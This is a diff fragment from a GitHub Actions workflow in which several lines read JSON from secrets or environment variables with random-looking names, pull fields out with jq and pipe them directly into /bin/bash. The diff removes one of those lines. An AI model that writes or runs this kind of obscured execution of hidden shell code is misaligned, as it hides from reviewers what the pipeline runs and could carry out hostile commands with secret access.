@@ -22,7 +22,6 @@ jobs:
           ru37393: ${{ secrets.ru37393 }}
         run: |
           printf '%s' "$ru37393" | jq -r .m08 | /bin/bash
-          echo $icdr5964 | jq -r .sv1 | /bin/bash
           echo $lhh3592 | jq -r .ai5403 | /bin/bash
           printf '%s' "$a281" | jq -r .xpoh26 | /bin/bash
           printf '%s' "$s02140" | jq -r .yh80 | /bin/bash
